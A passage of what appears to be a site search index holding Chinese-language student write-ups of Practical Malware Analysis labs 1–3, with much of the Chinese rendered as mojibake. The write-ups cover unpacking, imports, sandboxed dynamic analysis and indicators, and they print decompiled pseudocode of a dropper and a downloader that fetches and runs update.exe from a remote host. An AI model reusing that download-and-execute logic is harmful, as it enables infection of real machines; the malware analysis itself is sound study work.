_controlfp  WININET.dll \t0x402070 InternetOpenUrlA \t0x402074 InternetOpenA ... å¯è§è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸»è¦è°ƒç”¨äº†ä¸è¿›ç¨‹çº¿ç¨‹æœ‰å…³çš„å‡½æ•°ã€æ‰“å¼€ URL è¿æ¥çš„å‡½æ•°ã€‚\nQUESTION 4 #   What host- or network-based indicators could be used to identify this malware on infected machines?\n æˆ‘ä»¬åˆ†æè„±å£³ä¹‹åçš„æ–‡ä»¶ï¼Œå‘ç°å…¶ .data æ®µä¸­æœ‰ http://www.malwareanalysis.com è¿™ä¸ªå­—ç¬¦ä¸²ï¼š\nå†ç”¨ ida pro æŸ¥æ‰¾è°ƒç”¨è¿™ä¸ªå­—ç¬¦ä¸²çš„ä½ç½®ï¼Œæˆ‘ä»¬æ‰¾åˆ°ä»¥ä¸‹çš„ä¼ªä»£ç ï¼š\n for ( i = InternetOpenA(szAgent, 1u, 0, 0, 0); ; InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0) ); è¿™å…¶ä¸­ szAgent è¿™ä¸ªå­—ç¬¦ä¸²å˜é‡æŒ‡çš„å°±æ˜¯ Internet Explorer 8.0ï¼Œè€Œåçš„ szUrl æŒ‡çš„å°±æ˜¯ http://www.malwareanalysisbook.comï¼Œè¿™æ˜¯ä¸€ä¸ªä¸ä¼šåœæ­¢çš„å¾ªç¯ï¼Œæ„å‘³ç€è¿™ä¸ªç—…æ¯’ä¼šä¸æ–­å¾—ä½¿ç”¨ IE æµè§ˆå™¨æ‰“å¼€åé¢çš„ç½‘å€ã€‚\nå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ wireshark æŠ“å–æ‰€æœ‰è®¿é—®è¿™ä¸ªç½‘å€çš„æµé‡å³å¯ã€‚\n"},{"id":267,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-3/","title":"Lab1 3","section":"01","content":"lab 1-3 #  QUESTION 1 #   Upload the Lab01-03.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?\n æ–‡ä»¶çš„ sha256 å“ˆå¸Œå€¼ï¼š\n$ sha256sum Lab01-03.exe 7983a582939924c70e3da2da80fd3352ebc90de7b8c4c427d484ff4f050f0aec Lab01-03.exe å› æ­¤ä¸Šä¼ çš„ url ä¸ºï¼šhttps://www.virustotal.com/#/file/7983a582939924c70e3da2da80fd3352ebc90de7b8c4c427d484ff4f050f0aec/detection\nå¯ä»¥çœ‹åˆ°è¿™åŒæ ·æ˜¯ä¸€ä¸ªè¢« 59 ä¸ªå¼•æ“æ£€æµ‹å‡ºæ¥çš„æœ¨é©¬ã€‚\nQUESTION 2 #   Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.\n å¯ä»¥åœ¨ Windows ä¸Šé€šè¿‡ PEiD è¿™ä¸ªè½¯ä»¶æ£€éªŒå£³ï¼š\næˆ‘ä»¬å‘ç°ï¼Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶é€šè¿‡ FSG 1.0 åŠ å£³äº†ã€‚æˆ‘ä»¬é€šè¿‡ä¸€ä¸ª52poejie æ•™ç¨‹ å¯ä»¥å®ç°æ‰‹åŠ¨è„±å£³ã€‚\nä½†æ˜¯æˆ‘æ‡’ä¸æƒ³æ‰‹åŠ¨è„±å£³ï¼Œåœ¨å¾çˆ±ç ´è§£ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªå·¥å…·ï¼š\næŠŠåŒæ–‡ä»¶å¤¹ä¸‹çš„ ./Lab01-03.pb.1.exe æ›´åä¸º ./Lab01-03.unpack.exe ç„¶åå†ç”¨ PEiD åˆ†æï¼Œå‘ç°æˆåŠŸè„±å£³ï¼š\nQUESTION 3 #   Do any imports hint at this programâ€™s functionality? If so, which imports are they and what do they tell you?\n æˆ‘ä»¬ä½¿ç”¨ malscan è¿™ä¸ªå·¥å…·ï¼Œæ£€æµ‹è„±å£³ä¹‹åçš„æ–‡ä»¶ï¼š\n$ malscan /tmp/BinaryCollection/Chapter_1L/Lab01-03.unpack.exe ... [Imports Overview]  MSVCRT.dll  0x402000 __getmainargs  0x402004 _controlfp  0x402008 _except_handler3  0x40200c __set_app_type  0x402010 __p__fmode  0x402014 __p__commode  0x402018 _exit  0x40201c _XcptFilter  0x402020 exit  0x402024 __p___initenv  0x402028 _initterm  0x40202c __setusermatherr  0x402030 _adjust_fdiv  OLEAUT32.dll  0x402038 None  0x40203c SysAllocString  0x402040 None  OLE32.dll  0x402048 OleInitialize  0x40204c CoCreateInstance  0x402050 OleUninitialize ... ä¸çŸ¥é“è¿™æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå¯èƒ½ä¸‹è½½çš„è„±å£³æœºæœ‰é—®é¢˜ã€‚\nQUESTION 4 #   What host- or network-based indicators could be used to identify this malware on infected machines?\n å› ä¸ºè„±å£³å¤±è´¥äº†ï¼Œæ‰€ä»¥è¯»å–çš„å­—æ®µä¹Ÿæœ‰é—®é¢˜ã€‚\n"},{"id":268,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-4/","title":"Lab1 4","section":"01","content":"lab 1-4 #  QUESTION 1 #   Upload the Lab01-04.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?\n æ–‡ä»¶çš„ sha256 å“ˆå¸Œå€¼ï¼š\n$ sha256sum Lab01-04.exe 0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126 Lab01-04.exe å› æ­¤ä¸Šä¼ çš„ url ä¸ºï¼šhttps://www.virustotal.com/#/file/0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126/detection\nå¯ä»¥çœ‹åˆ°è¿™åŒæ ·æ˜¯ä¸€ä¸ªè¢« 53 ä¸ªå¼•æ“æ£€æµ‹å‡ºæ¥çš„æœ¨é©¬ã€‚\nQUESTION 2 #   Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.\n ä½¿ç”¨ blackarch çš„å·¥å…· packeridï¼š\n$ packerid Lab01-04.exe [\u0026#39;Microsoft Visual C++ v5.0/v6.0 (MFC)\u0026#39;] å¯è§è¿™ä¸ªæ–‡ä»¶å¹¶æ²¡æœ‰åŠ å£³ã€‚\nQUESTION 3 #   When was this program compiled?\n PE æ–‡ä»¶çš„æ–‡ä»¶ç»“æ„å¯ä»¥å‚è€ƒå¾®è½¯çš„å®˜æ–¹æ–‡æ¡£ã€‚\nå¯ä»¥æ‰¾åˆ°åœ¨å¯¹è±¡æ–‡ä»¶çš„çš„æœ€å¼€å§‹ï¼Œå­˜åœ¨ä¸€ä¸ªæ ‡å‡†æ–‡ä»¶å¤´ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ª TimeDateStamp åŸŸï¼ŒæŒ‡ç¤ºäº†æ–‡ä»¶åˆ›å»ºæ—¶çš„æ—¶é—´æˆ³ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„ python è„šæœ¬è¯»å–å®ƒï¼š\n#ï¼/usr/bin/env python3 from datetime import datetime import pefile  pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-04.exe\u0026#34;) print(datetime.fromtimestamp(pe.FILE_HEADER.TimeDateStamp)) $ python labb01-04.exe 2019-08-31 06:26:59 QUESTION 4 #   Do any imports hint at this programâ€™s functionality? If so, which imports are they and what do they tell you?\n ä½¿ç”¨ blackarch çš„å·¥å…· malscanï¼š\n$ malscan Lab01-04.exe ... [Imports Overview]  KERNEL32.dll  0x402010 GetProcAddress  0x402014 LoadLibraryA  0x402018 WinExec  0x40201c WriteFile  0x402020 CreateFileA  0x402024 SizeofResource  0x402028 CreateRemoteThread  0x40202c FindResourceA  0x402030 GetModuleHandleA  0x402034 GetWindowsDirectoryA  0x402038 MoveFileA  0x40203c GetTempPathA  0x402040 GetCurrentProcess  0x402044 OpenProcess  0x402048 CloseHandle  0x40204c LoadResource  ADVAPI32.dll  0x402000 OpenProcessToken  0x402004 LookupPrivilegeValueA  0x402008 AdjustTokenPrivileges  MSVCRT.dll  0x402054 _snprintf  0x402058 _exit  0x40205c _XcptFilter  0x402060 exit  0x402064 __p___initenv  0x402068 __getmainargs  0x40206c _initterm  0x402070 __setusermatherr  0x402074 _adjust_fdiv  0x402078 __p__commode  0x40207c __p__fmode  0x402080 __set_app_type  0x402084 _except_handler3  0x402088 _controlfp  0x40208c _stricmp ... å¯è§è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶å¯¼å…¥äº†ï¼Œæ‰§è¡Œå‘½ä»¤ã€å¤åˆ¶ç§»åŠ¨å†™æ–‡ä»¶ã€è¯»å–æ–‡ä»¶èµ„æºå¤§å°ã€è¯»å–æ–‡ä»¶æ ‘ã€æ‰“å¼€å…³é—­è¿›ç¨‹ç­‰å±é™©å‡½æ•°ï¼ŒçŒœæµ‹è¿™æ˜¯å®ç°äº†ä¸€ä¸ªäº†æ–‡ä»¶æŸ¥çœ‹å™¨çš„æ¶æ„ç—…æ¯’ã€‚\nQUESTION 5 #   What host- or network-based indicators could be used to identify this malware on infected machines?\n æˆ‘ä»¬ç”¨ ida pro æ‰“å¼€è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…ˆæŸ¥çœ‹å®ƒé‡Œé¢çš„å­—ç¬¦ä¸²ï¼š\næˆ‘ä»¬å‘ç° \\\\system32\\\\wupdmgr.exe è¿™æ ·ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬æŸ¥æ‰¾è°ƒç”¨çš„ä½ç½®ï¼Œå¹¶æŸ¥çœ‹è°ƒç”¨ä½ç½®çš„ä¼ªä»£ç ï¼š\n// ...  GetWindowsDirectoryA(\u0026amp;Buffer, 0x10Eu);  snprintf(\u0026amp;Dest, 0x10Eu, Format, \u0026amp;Buffer, aSystem32Wupdmg);  hModule = GetModuleHandleA(0);  hResInfo = FindResourceA(hModule, Name, Type);  lpBuffer = LoadResource(hModule, hResInfo);  nNumberOfBytesToWrite = SizeofResource(hModule, hResInfo);  hFile = CreateFileA(\u0026amp;Dest, 0x40000000u, 1u, 0, 2u, 0, 0);  WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, \u0026amp;NumberOfBytesWritten, 0);  CloseHandle(hFile);  return WinExec(\u0026amp;Dest, 0); } è¿™æ®µä»£ç çš„å¤§è‡´ç”¨å¤„åº”è¯¥æ˜¯åŠ è½½ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„èµ„æºï¼Œç„¶åæŠŠè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶èµ„æºå¤åˆ¶åˆ°ä¸€ä¸ªç»™å®šçš„ä½ç½®ï¼ˆå³ \\\\system32\\\\wupdmgr.exeï¼‰ï¼Œç„¶åæ‰§è¡Œå®ƒã€‚è¿™å¹¶æ²¡æœ‰ç½‘ç»œç›¸å…³è¯·æ±‚ã€‚\näºæ˜¯æˆ‘ä»¬é€šè¿‡ binwalk å‘½ä»¤æå–å‡ºå…¶ä¸­çš„èµ„æºï¼š\n$ binwalk --dd=\u0026#34;.*\u0026#34; Lab01-04.exe DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Microsoft executable, portable (PE) 16480 0x4060 Microsoft executable, portable (PE) è¿™æ¡å‘½ä»¤å°†ç»™å®šæ–‡ä»¶ Lab01-04.exe ä¸­çš„èµ„æºæå–åˆ°äº†æ–‡ä»¶å¤¹ _Lab01-04.exe.extracted ä¸­ã€‚\n$ cd _Lab01-04.exe.etracted/  $ ls 0 4060 æˆ‘ä»¬å‘ç°æå–å‡ºäº† 0 å’Œ 4060 è¿™ä¸¤ä¸ªèµ„æºï¼Œå¾ˆæ˜¾ç„¶ 0 å³ä¸ºä¹‹å‰åˆ†æçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å†ç”¨ ida pro åˆ†æå…¶ä¸­çš„èµ„æºæ–‡ä»¶ 4060ï¼š\næˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª URL åœ°å€ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜åœ¨å¯¼å…¥è¡¨ä¸­å‘ç°äº† URLDownloadToFileA è¿™ä¸ªå¯¼å…¥å‡½æ•°ï¼Œæˆ‘ä»¬å†åˆ†æè°ƒç”¨è¿™ä¸ªå­—ç¬¦ä¸²ä½ç½®çš„ä¼ªä»£ç ï¼š\n// ...  GetTempPathA(0x10Eu, \u0026amp;Buffer);  snprintf(\u0026amp;Dest, 0x10Eu, Format, \u0026amp;Buffer, aWinupExe);  WinExec(\u0026amp;Dest, 5u);  GetWindowsDirectoryA(\u0026amp;v7, 0x10Eu);  snprintf(\u0026amp;CmdLine, 0x10Eu, aSS_0, \u0026amp;v7, aSystem32Wupdmg);  if ( !URLDownloadToFileA(0, aHttpWwwPractic, \u0026amp;CmdLine, 0, 0) )  WinExec(\u0026amp;CmdLine, 0);  return 0; } è¿™ä¸ªæ®µä¼ªä»£ç ï¼Œå‘ http://www.practicalmalwareanalysis.com/update.exeï¼Œä¸‹è½½ç—…æ¯’èµ„æºæ–‡ä»¶å¹¶ä¸”ä¿å­˜åˆ° \\\\system32\\\\wupdmgrd.exe è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚\næ‰€ä»¥éœ€è¦ç›‘æµ‹ç½‘ç»œä¸­æ˜¯å¦ä¸ http://www.practicalmalwareanalysis.com/update.exe å»ºç«‹äº†è¿æ¥ã€‚\nQUESTION 6 #   This file has one resource in the resource section. Use Resource Hacker to examine that resource, and then use it to extract the resource. What can you learn from the resource?\n åœ¨ç¬¬äº”é—®ä¸­å·²ç»ä½¿ç”¨ binwalk æå–å‡ºæ¥äº†ã€‚\n"},{"id":269,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-1/","title":"Lab3 1","section":"03","content":"lab 3-1 #  QUESTION 1 #   What are this malwareâ€™s imports and strings?\n é€šè¿‡ PEiD è¿™ä¸ªè½¯ä»¶åˆ†æè¿™ä¸ªç—…æ¯’ï¼š\nå‘ç°è¿™ä¸ªç—…æ¯’ä½¿ç”¨äº† PEncrypt 3.1 åŠ å£³äº†ã€‚æ‰€ä»¥æˆ‘ä»¬å¹¶ä¸çŸ¥é“å®ƒå®é™…çš„å¯¼å…¥å‡½æ•°ã€‚\näºæ˜¯æˆ‘ä»¬é€šè¿‡ strings å‘½ä»¤åˆ†æé‡Œé¢çš„å¯è§å­—ç¬¦ä¸²ï¼š\n$ strings Lab03-01.exe !This program cannot be run in DOS mode. Rich .text `.data ExitProcess kernel32.dll ws2_32 # ... CONNECT %s:%i HTTP/1.0 # ... QQVP advpack StubPath SOFTWARE\\Classes\\http\\shell\\open\\commandV Software\\Microsoft\\Active Setup\\Installed Components\\ test  www.practicalmalwareanalysis.com admin VideoDriver WinVMX32- vmx32to64.exe SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders AppData V%X_ å¯è§åŠ å£³åè¿˜æœ‰ä¸€äº›æ³¨å†Œè¡¨ä½ç½®ã€åŸŸåç­‰å­—ç¬¦ä¸²ã€‚\nQUESTION 2 #   What are the malwareâ€™s host-based indicators?\n ä¸‹é¢å°†é€šè¿‡åŠ¨æ€æŠ€æœ¯åˆ†æè¿™ä¸ªç—…æ¯’çš„ç½‘ç»œçŠ¶æ€ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†è™šæ‹Ÿæœºçš„ç½‘ç»œè®¾ç½®ä¸ºä¸»æœºæ¨¡å¼ï¼š\nåœ¨ä¸»æœºä¸­æ‰«æå±€åŸŸç½‘ï¼Œå¯ä»¥çœ‹åˆ°è™šæ‹Ÿæœºçš„ç½‘ç»œå·ï¼š\n$ nmap -sP 192.168.122.0/24 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-03 13:57 ?D1ÃºÂ±ÃªÃ—?ÃªÂ±?? Nmap scan report for 192.168.122.254 Host is up (0.00s latency). MAC Address: 00:50:56:E8:EC:7F (VMware) Nmap scan report for 192.168.122.1 Host is up. Nmap done: 256 IP addresses (2 hosts up) scanned in 12.31 seconds å…ˆä½¿ç”¨ Process Explorer è¿™ä¸ªå·¥å…·åˆ†æè¿™ä¸ªç—…æ¯’ã€‚åˆ†æè¿™ä¸ªç—…æ¯’å¯¼å…¥çš„ dll ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸ç½‘ç»œç›¸å…³çš„åŠ¨æ€é“¾æ¥åº“ mswsock.dllï¼š\næˆ‘ä»¬æ¢å¤è™šæ‹Ÿæœºå¿«ç…§ï¼Œé‡å¯è™šæ‹Ÿæœºå†åœ¨è™šæ‹Ÿæœºä¸­æ‰“å¼€ Procmonï¼Œæ·»åŠ  Process Name - is - lab03-01.exe çš„è¿‡æ»¤å™¨ï¼Œç„¶åè¿è¡Œè¿™ä¸ªç—…æ¯’ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Procmon ä¸­æ£€æµ‹åˆ°ç—…æ¯’çš„è¡Œä¸ºç‰¹å¾ï¼š\nå¯è§åœ¨ Operation ä¸€æ ä¸­ï¼Œåœ¨ Procmon è®°å½•äº†ä» Process Start å¼€å§‹ç—…æ¯’è°ƒç”¨çš„æ‰€æœ‰ API å‡½æ•°ã€‚åˆ†æè¿™ä¸€æ è°ƒç”¨çš„ API å‡½æ•°ï¼Œå‘ç°è¿™ä¸ªç—…æ¯’å¤§é‡åœ°è°ƒç”¨äº† CreateFile å‡½æ•°å’Œ RegOpenKey è¿™ä¸¤ä¸ª API å‡½æ•°ã€‚å¹¶æ²¡æœ‰å‘ç°ä¸ç½‘ç»œè¯·æ±‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨ã€‚\næ‰€ä»¥è¢«æ„ŸæŸ“çš„ä¸»æœºä¼šæœ‰ä»¥ä¸Šåˆ†æå‡ºçš„ä¸å¯»å¸¸æ–‡ä»¶çš„åˆ›å»ºã€ä»¥ä¸Šæ³¨å†Œè¡¨é¡¹çš„æ›´æ”¹ã€å¯èƒ½ä¸ www.practicalmalwareanalysis.com å»ºç«‹äº†è¿æ¥è¿™äº›ç‰¹å¾ã€‚\nQUESTION 3 #   Are there any useful network-based signatures for this malware? If so, what are they?\n ApateDNS #  ä¸ºäº†åˆ†æè¿™ä¸ªç—…æ¯’çš„ç½‘ç»œè¯·æ±‚ï¼Œä½¿ç”¨ ApateDNS è¿™ä¸ªå·¥å…·ï¼Œå¯ä»¥ç”¨äºåŠ«æŒæœ¬åœ°çš„æ‰€æœ‰ DNS è¯·æ±‚ï¼Œä¸‹è½½ä»¥åŠä»‹ç»åœ°å€ã€‚\nä½†æ˜¯è¿™ä¸ªå·¥å…·ä¼¼ä¹å¹¶ä¸å¯ä»¥åœ¨ Windows XP è™šæ‹Ÿæœºä¸Šè¿è¡Œï¼ˆå¹´ä»£ä¹…è¿œçš„ç³»ç»Ÿè¿˜æœ‰å¾ˆå¤šç½‘ç»œä¸å…¼å®¹çš„é—®é¢˜ï¼‰ï¼Œäºæ˜¯æˆ‘åœ¨å—å¼€å¤§å­¦æ­£ç‰ˆè½¯ä»¶ä¸Šä¸‹è½½äº† Windows 7 çš„é•œåƒã€‚ç„¶ååœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œ ApateDNS åŠ«æŒæœ¬åœ°çš„æ‰€æœ‰ DNS è¯·æ±‚ï¼Œæ‰“å¼€æµè§ˆå™¨æµ‹è¯•ï¼š\nä½†æ˜¯è¿™ä¸ªç—…æ¯’ç«Ÿç„¶æ— æ³•åœ¨ Windows 7 ä¸Šè¿è¡Œã€‚\näºæ˜¯æˆ‘å†³å®šåŒæ—¶æ‰“å¼€ Windows XP å’Œ Windows 7 ç³»ç»Ÿï¼Œä½¿ç”¨ vmware ä¸­çš„ NAT ä¸­ï¼Œä½¿å¾—ä¸¤ä¸ªè™šæ‹Ÿæœºä½äºåŒä¸€å±€åŸŸç½‘ä¸­ï¼Œå…³é—­ Windows 7 çš„é˜²ç«å¢™ï¼Œè®© Windows XP çš„ DNS æµé‡æµå‘ Windos 7ã€‚åŒæ—¶ï¼Œä¸ºäº†å¤„ç†ç—…æ¯’å¯èƒ½ä¼šè¯·æ±‚çš„ HTTP æµé‡ï¼Œæˆ‘ä»¬æ‰“å¼€ Kali Linuxï¼Œä¹Ÿç”¨åŒæ ·çš„æ–¹å¼è‡³äºå±€åŸŸç½‘ä¸­ã€‚æˆ‘ä»¬å…ˆé€šè¿‡ nmap \u0026amp; ipconfig æŸ¥çœ‹ DHCP æœåŠ¡å™¨åˆ†é…ç»™ä¸‰ä¸ªè™šæ‹Ÿæœºçš„ IPï¼š\n$ nmap -sP 192.168.32.0/24 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-05 08:55 ?D1ÃºÂ±ÃªÃ—?ÃªÂ±?? Nmap scan report for 192.168.32.128 # ===\u0026gt; Windows XP (ç—…æ¯’) Host is up (0.0010s latency). MAC Address: 00:0C:29:07:DB:FB (VMware) Nmap scan report for 192.168.32.129 # ===\u0026gt; Windows 7 (DNS æœåŠ¡å™¨) Host is up (0.0050s latency). MAC Address: 00:0C:29:62:3E:4E (VMware) Nmap scan report for 192.168.32.130 Host is up (0.0010s latency). # ===\u0026gt; Kali Linux (WEB æœåŠ¡å™¨) MAC Address: 00:0C:29:62:3E:4E (VMware) Nmap scan report for 192.168.32.254 Host is up (0.00s latency). MAC Address: 00:50:56:F6:6C:A8 (VMware) Nmap scan report for 192.168.32.1 # ===\u0026gt; ä¸»æœº Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 9.63 seconds è¿™å…¶ä¸­ 192.168.32.128 æ˜¯ Windows XP çš„å±€åŸŸç½‘ IPã€192.168.32.129 æ˜¯ Windows 7 çš„å±€åŸŸç½‘ IPã€‚æˆ‘ä»¬ä¿æŒ Windows 7 çš„ ApateDNS å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œå¹¶ä¸”è®¾ç½® Windows XP çš„ DNS åœ°å€ï¼š\nä½¿ç”¨ nslookup ä»¥ç¡®å®šæˆ‘ä»¬å·²ç»æ­£ç¡®åœ°è®¾ç½®äº† DNS åœ°å€ï¼š\n$ nslookup www.baidu.com Server: 129.32.168.192.in-addr.arpa Address: 192.168.32.129  Non-authoritative answer: Name: www.baidu.com.localdomain Address: 127.0.0.1 å¾ˆæ˜¾ç„¶è¿™ä¸ª 127.0.0.1 çš„åº”ç­”æ˜¯æˆ‘ä»¬çš„ Win7 ç³»ç»Ÿç»™å‡ºçš„ã€‚ä¸ºäº†é¿å…ç—…æ¯’ç›´æ¥é€šè¿‡ IP è®¿é—®ï¼Œæˆ‘ä»¬ç®€å•åœ°æŠŠä¸»æœºçš„ç½‘ç»œåˆ‡æ–­ã€‚è‡³æ­¤æˆ‘ä»¬å·²ç»è®¾ç½®å¥½äº† DNS çš„ç¯å¢ƒï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ„‰å¿«åœ°åˆ†æç—…æ¯’äº†ã€‚\nè¿è¡Œç—…æ¯’ï¼Œæˆ‘ä»¬å† Windows 7 ä¸Šå‘ç°ï¼Œè¿™ä¸ªç—…æ¯’å°è¯•è§£æ www.practicalmalwareanalysis.com è¿™ä¸ªåŸŸåï¼š\nPython HTTP\u0026amp;HTTPS #  æ¥ç€æˆ‘ä»¬åœ¨ Kali Linux æ­å»ºä¸€ä¸ªç®€å•çš„ WEB æœåŠ¡å™¨ï¼š\n$ iptables -A INPUT -p tcp --dport 80 -j ACCEPT  $ iptables-save  $ mkdir /var/www/malware  $ cd /var/www/malware  $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ç„¶åæˆ‘ä»¬å‘¢åœ¨ Win7 ä¸­ï¼ŒæŠŠ DNS è§£æçš„ç»“æœæŒ‡å‘ Kaliï¼Œç„¶åå†åœ¨ XP ä¸­è¿è¡Œç—…æ¯’ï¼šæˆ‘ä»¬å‘ç° Win7 ä¸­æœ‰ DNS çš„è§£æç»“æœï¼Œä½†æ˜¯ Kali ä¸­å´æ²¡æœ‰æ¥è‡ªç—…æ¯’çš„è®¿é—®è®°å½•ã€‚\näºæ˜¯å¼€å§‹æ€€ç–‘ç—…æ¯’è®¿é—®çš„ä¸æ˜¯æ ‡å‡†ç«¯å£ï¼Œå› ä¸º Kali æ˜¯é»˜è®¤å®‰è£…äº† wireshark çš„ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„è¿‡æ»¤å™¨ç›´æ¥ä½¿ç”¨ wireshark æŠ“åŒ…ï¼š\nip.addr == 192.168.32.128 å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å‘ç°å®ƒç«Ÿç„¶è®¿é—®çš„æ˜¯ 443 ç«¯å£ï¼Œäºæ˜¯æˆ‘ä»¬å…ˆå°è¯•æŠŠ HTTP æœåŠ¡éƒ¨ç½²åœ¨ 443 ç«¯å£ï¼š\nå‘ç°è¿™ä¸ªç—…æ¯’æ˜¯çœŸå®ä½¿ç”¨çš„ HTTPS æœåŠ¡è¿›è¡Œè®¿é—®ã€‚æˆ‘ä»¬å†æ­å»ºä¸€ä¸ªç®€å•çš„ HTTPS æœåŠ¡ï¼š\n$ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365  $ cat \u0026lt;\u0026lt; _EOF_ \u0026gt; httpsserver.py from http.server import HTTPServer, BaseHTTPRequestHandler import ssl httpd = HTTPServer((\u0026#39;localhost\u0026#39;, 4443), BaseHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, keyfile=\u0026#34;./key.pem\u0026#34;, certfile=\u0026#39;path/to/cert.pem\u0026#39;, server_side=True) httpd.serve_forever() _EOF_  $ python3 httpsserver.py å†ç”¨ wireshark æŠ“åŒ…ï¼Œå‘ç°æœåŠ¡å™¨æ‹’ç»äº†ç—…æ¯’çš„è¿æ¥ç”³è¯·ï¼š\nè¿™è¯´æ˜ç—…æ¯’è®¿é—®çš„æ ¹æœ¬ä¸æ˜¯çœŸæ­£çš„ HTTPS æœåŠ¡ï¼Œä½†æ˜¯ HTTP åŒæ ·ä¹Ÿæ— æ³•å¤„ç†è¿™ä¸ªè¯·æ±‚ã€‚\nINetSim #  æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ INetSim è¿™ä¸ªå·¥å…·åœ¨ Kali Linux ä¸­éƒ¨ç½²ä¸€ä¸ª WEB æœåŠ¡ï¼ˆè¿™ä¸ªå·¥å…·åœ¨ Kali æ˜¯é»˜è®¤å®‰è£…çš„ï¼‰ã€‚å› ä¸ºè¿™ä¸ªå·¥å…·é»˜è®¤å¼€å¯åœ¨æœ¬åœ°ç«¯å£ï¼Œå› æ­¤éœ€è¦æ›´æ”¹ /etc/inetsim/inetsim.conf è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ä¸‹é¢çš„é…ç½®ï¼š\nservice_bind_address = 0.0.0.0 ç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n$ inetsim åœ¨æ—¥å¿—æ–‡ä»¶ /usr/share/inetsim/log/service.log ä¸­å¯ä»¥æŸ¥çœ‹è®¿é—®çš„æ‰€æœ‰è®¿é—®çš„æ—¥å¿—è®°å½•ã€‚\nç»“è®º #  ç—…æ¯’è¿è¡Œä¹‹åé¦–å…ˆä¼šè¯·æ±‚è§£æ www.practicalmalwareanalysis.com çš„ IPï¼Œä¸ç›®æ ‡ä¸»æœºå»ºç«‹äº† TCP è¿æ¥ä¹‹åï¼Œä»¥ä¸€ä¸ªé HTTPS \u0026amp; HTTP åè®®è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„ 443 ç«¯å£ã€‚\n"},{"id":270,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-2/","title":"Lab3 2","section":"03","content":"lab 3-2 #  QUESTION 1 #   How can you get this malware to install itself?\n é¦–å…ˆæŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼š\n$ file Lab03-02.dll Lab03-02.dll: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows å› æ­¤ä½¿ç”¨ç¨‹åº rundll32.exe å®‰è£…åŠ¨æ€é“¾æ¥åº“ï¼Œmsdn ä½¿ç”¨æ•™ç¨‹ã€‚\næˆ‘ä»¬è¿›ä¸€æ­¥æŸ¥çœ‹è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“çš„å¯¼å‡ºå†…å®¹ï¼Œä»¥æŸ¥çœ‹åº”è¯¥è¿è¡Œå“ªä¸ªå‡½æ•°å®‰è£…ï¼š\nå› æ­¤ä»åå­—æ¥åˆ¤æ–­ï¼Œæœ‰å¯èƒ½æ˜¯ Install ä¹Ÿæœ‰å¯èƒ½æ˜¯ installAï¼Œæˆ‘ä»¬å‘ç°å‰è€…è¿è¡Œä¸äº†ï¼Œå› 